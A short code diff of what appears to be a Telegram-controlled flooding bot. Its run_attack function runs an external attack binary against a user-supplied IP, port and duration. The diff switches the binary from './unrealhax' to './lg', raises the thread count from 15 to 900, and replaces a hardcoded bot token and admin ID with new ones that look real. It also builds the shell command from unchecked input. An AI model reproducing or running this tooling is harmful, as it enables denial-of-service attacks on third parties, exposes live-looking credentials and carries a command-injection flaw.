@@ -2,8 +2,8 @@ import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = '7948008935:AAFxfBDyxIarExNTxqCkbf4GnVQqxunAn4g'
-ADMIN_USER_ID = 7903853982
+TELEGRAM_BOT_TOKEN = '7707231907:AAGXHBKfsIvblHPJRR2cg1-G_78tm3YSR78'
+ADMIN_USER_ID = 1909392304
 USERS_FILE = 'users.txt'
 attack_in_progress = False
 
@@ -59,7 +59,7 @@ async def run_attack(chat_id, ip, port, duration, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./unrealhax {ip} {port} {duration} 15",
+            f"./lg {ip} {port} {duration} 900",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
